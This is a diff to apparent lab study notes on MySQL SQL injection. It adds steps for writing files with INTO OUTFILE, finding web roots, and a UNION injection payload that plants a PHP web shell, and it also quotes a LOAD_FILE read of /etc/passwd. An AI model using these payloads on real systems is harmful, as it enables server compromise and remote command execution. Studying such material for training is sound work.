@@ -957,21 +957,15 @@ cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4--
 
 ## Writing Files
 
-Being able to write files to a back-end database, may enable an attacker to upload a web shell and gain remote code execution. Modern DBMSs disable `file-write` by default.
-
-On MySQL, three things are required to write files to the back-end database:
-
-- `FILE` privileges
-- `secure_file_priv` must be disables
-- Write access to the specific location
+Being able to write files to the underlying server via the database may enable an attacker to upload a web shell and gain remote code execution. Modern DBMSs typically restrict file read and write operations through privilege checks and configuration options such as `secure_file_priv`. 
 
 In the previous section (Reading Files), user privileges were enumerated and we discovered that our user has `FILE` privileges.
 
-The next step is checking the `secure_file_priv` variable. The different scenarios are:
+The next step is checking the `secure_file_priv` variable. The variable may be set to:
 
-- Empty value - can read/write from entire filesystem
-- Specific directory - can read/write from this directory
-- NULL - cannot read/write from anywhere
+- `NULL` &rarr; no read/write allowed
+- Empty string &rarr; no restriction
+- Directory path &rarr; restricted to that path
 
 Global variables are stored in the `INFORMATION_SCHEMA` database in a table called `GLOBAL_VARIABLES`. This table has two columns called `variable_name` and `variable_value`. 
 
@@ -997,3 +991,41 @@ cn' UNION SELECT 1, variable_name, variable_value, 4 FROM INFORMATION_SCHEMA.GLO
 ![Filtered output](images/secure-file-priv.png)
 
 The variable value is empty, indicating that we can read/write across the entire filesystem.
+
+The `INTO OUTFILE` statement is used to write data from a query into a file, but it can also be used to write arbitrary data into a file. To write arbitrary data, the target file must not already exist, and the MySQL process must have filesystem write permissions to the target location.
+
+```sql
+-- Data from query into file
+SELECT * FROM users INTO OUTFILE '/tmp/credentials';
+
+-- Arbitrary data into file
+SELECT 'hackerman' INTO OUTFILE '/tmp/hackerman.txt';
+```
+
+To write a web shell to the underlying server, we must know the web root (base directory) of the web server. For `Apache` servers, the web root is commonly located at `/var/www/html/`, though this may vary depending on configuration.
+
+The location of the web root can typically be found in the server's corresponding configuration file. These configuration files are commonly located at:
+
+- `/etc/apache2/apache2.conf`
+- `/etc/nginx/nginx.conf`
+- `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
+
+The following payload can be utilized to inject a basic PHP web shell:
+
+```sql
+-- Query
+SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'
+```
+
+```sql
+-- Payload
+cn' UNION SELECT 1, '<?php system($_REQUEST[0]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'-- 
+```
+
+We can communicate with the web shell by visiting the web root URL and issue commands through the GET parameter `0`:
+
+```
+http://94.237.61.242:31929/shell.php?0=ls+-la
+```
+
+![Filtered output](images/file-write-shell.png)
